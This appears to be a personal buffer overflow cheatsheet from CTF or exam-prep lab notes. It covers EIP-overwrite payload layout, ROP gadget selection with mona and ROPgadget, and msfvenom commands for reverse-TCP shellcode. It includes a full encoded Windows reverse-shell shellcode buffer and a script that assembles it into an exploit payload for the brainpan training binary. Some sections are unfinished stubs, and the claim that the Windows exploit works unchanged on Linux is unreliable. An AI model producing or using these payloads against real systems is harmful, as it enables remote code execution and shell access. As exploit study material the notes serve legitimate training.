# Buffer Overflow cheatsheet

## Generating Shellcode

```text
For Windows vulnerable machine
1. msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.1.77 -e x86/shikata_ga_nai -b '\x00' -f python --smallest -v shellcode
2. msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -e x86/unicode_mixed -b '\x00' BufferRegister=EAX -f python

For Linux vulnerable machine
1. msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.0.2.15 -e x86/shikata_ga_nai -b '\x00' -f python --smallest -v shellcode
```

## Payload Format

* **payload = junk + shell\_addr + \(nops + shellcode\)**
  * `junk` : is offset before the EIP overwritten.
  * `shell_addr` : is the address which we overwrite on the EIP register.
  * `(nops + shellcode)` : actual shell code address, we need to include nops for smooth execution of shellcode. nops are part of shellcode

## Computing shell\_addr 

1\) Hardcoding shellcode address

* Requirements
  * We need ASLR disabled. address randomization for stack memory
  * We need no null byte in hardcoded address of \(nops + shellcode\).
  * We need the stack executable.

2\) If shellcode address contain null byte.

* We need to use ROP gadgets to solve it.
* Requirements
  * We need ASLR disabled. address randomization on stack
  * We need the stack executable.
  * ROP objects need to be present which do not have null byte in its address.

3\) Even if the shellcode is not running

* It could be due to bad characters. There is a method to find bad characters.

## ROP Gadgets

* Different types of ROP gadgets. Depending on the ROP gadget we decide the payload format.
  * JMP ESP
  * POP RET
  * POP POP RET
* Not when we use ROP gadget, we inject our shellcode inside the "junk" text itself. From experience we  know that "**there is call made back to the stack"** after execution of ROP gadget which points to start of the "junk" address.
* The format **payload = buf + junk\_remaining + ROP\_addr** is for **POP RET**
  * where `buf` is our reverse tcp shellcode
  * where `junk_remaining` = junk - len\(buf\)
  * where `ROP_addr` is the address of the ROP gadget.
* The format **payload = junk + ROP\_addr + shellcode** is for **JMP ESP**
* d

### Sample payload

```text
buf =  ""
buf += "\x48\xf5\x40\x42\x2f\x48\x4a\x49\x99\x4b\xb8\x1b\xa4"	#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.137.141 LPORT=10000 -n 10 --arch x86 --platform windows -f python -b "\x00"
buf += "\x79\xd9\xdd\xc5\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x52"	# nops are pre included in shellcode.
buf += "\x31\x45\x12\x03\x45\x12\x83\xde\xa0\x9b\x2c\x1c\x40"
buf += "\xd9\xcf\xdc\x91\xbe\x46\x39\xa0\xfe\x3d\x4a\x93\xce"
buf += "\x36\x1e\x18\xa4\x1b\x8a\xab\xc8\xb3\xbd\x1c\x66\xe2"
buf += "\xf0\x9d\xdb\xd6\x93\x1d\x26\x0b\x73\x1f\xe9\x5e\x72"
buf += "\x58\x14\x92\x26\x31\x52\x01\xd6\x36\x2e\x9a\x5d\x04"
buf += "\xbe\x9a\x82\xdd\xc1\x8b\x15\x55\x98\x0b\x94\xba\x90"
buf += "\x05\x8e\xdf\x9d\xdc\x25\x2b\x69\xdf\xef\x65\x92\x4c"
buf += "\xce\x49\x61\x8c\x17\x6d\x9a\xfb\x61\x8d\x27\xfc\xb6"
buf += "\xef\xf3\x89\x2c\x57\x77\x29\x88\x69\x54\xac\x5b\x65"
buf += "\x11\xba\x03\x6a\xa4\x6f\x38\x96\x2d\x8e\xee\x1e\x75"
buf += "\xb5\x2a\x7a\x2d\xd4\x6b\x26\x80\xe9\x6b\x89\x7d\x4c"
buf += "\xe0\x24\x69\xfd\xab\x20\x5e\xcc\x53\xb1\xc8\x47\x20"
buf += "\x83\x57\xfc\xae\xaf\x10\xda\x29\xcf\x0a\x9a\xa5\x2e"
buf += "\xb5\xdb\xec\xf4\xe1\x8b\x86\xdd\x89\x47\x56\xe1\x5f"
buf += "\xc7\x06\x4d\x30\xa8\xf6\x2d\xe0\x40\x1c\xa2\xdf\x71"
buf += "\x1f\x68\x48\x1b\xda\xfb\xb7\x74\x6d\x76\x5f\x87\x6d"
buf += "\xae\xb0\x0e\x8b\xda\xa0\x46\x04\x73\x58\xc3\xde\xe2"
buf += "\xa5\xd9\x9b\x25\x2d\xee\x5c\xeb\xc6\x9b\x4e\x9c\x26"
buf += "\xd6\x2c\x0b\x38\xcc\x58\xd7\xab\x8b\x98\x9e\xd7\x03"
buf += "\xcf\xf7\x26\x5a\x85\xe5\x11\xf4\xbb\xf7\xc4\x3f\x7f"
buf += "\x2c\x35\xc1\x7e\xa1\x01\xe5\x90\x7f\x89\xa1\xc4\x2f"
buf += "\xdc\x7f\xb2\x89\xb6\x31\x6c\x40\x64\x98\xf8\x15\x46"
buf += "\x1b\x7e\x1a\x83\xed\x9e\xab\x7a\xa8\xa1\x04\xeb\x3c"
buf += "\xda\x78\x8b\xc3\x31\x39\xbb\x89\x1b\x68\x54\x54\xce"
buf += "\x28\x39\x67\x25\x6e\x44\xe4\xcf\x0f\xb3\xf4\xba\x0a"
buf += "\xff\xb2\x57\x67\x90\x56\x57\xd4\x91\x72"

junk = 'A'* (524 - len(buf))        #where 524 is the offset after which EIP is overwritten.    
rop_addr = '\x25\x27\x21\x77'        #77212725

payload = buf + junk + rop_addr
```

![](../.gitbook/assets/image%20%2833%29.png)

* Right click on the command box -&gt; Search for -&gt; Sequence of commands

```text
POP EAX
POP EBX
RET
```

* "ctrl + l" to find the next search result.

### Finding ROP in linux 1

* Used to find ROP gadgets in a .exe file.
* Download the [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) script.
* Using ROPgadget find the ROP gadgets on the vulnerable .exe file.

![](../.gitbook/assets/image%20%2857%29.png)

### Finding ROP in linux 2

* d

### Finding ROP gadgets in immunity debugger

* We could used this approach to find ROP gadgets in modules only. We cannot use it on .exe files.
* modules means all .dll files that the current program uses. 
* `!mona modules`
* Then we need to decide which modules to use. We use that modules that have most of the necessary protection mechanisms disabled. Like "ASLR", "DEP", "NX" ,etc.

![list of modules](../.gitbook/assets/image%20%286%29.png)

* We selected the brainpan.exe executable as all of the security protections are disabled.
* Our task now is to statically find ROP gadgets. We now can use "[Finding ROP in linux 1](./#finding-rop-in-linux-1)" approach for this mentioned above.

### Could the same exploit on windows x86 be used in linux x86 without modifying a single information?

* Yes but we need some Requirements for this:
  * Run `!mona modules` We need essential memory protection mechanisms disabled on the vulnerable `.exe` file
  * There should be ROP gadgets in the `.exe` file.
  * We need to run the same `.exe` file on the x86 linux machine.
* The only issue with such kind of exploit are the "**hardcoded addresses**".
* If we use ROP gadget method "JMP ESP" for buffer overflow, we have only one hardcoded address, that is of the address of the ROP gadget.
* If we met all the requirements mentioned above. Then the ROP gadget address will not change irrespective of the underlying OS, as it is present inside the `.exe` file itself. 

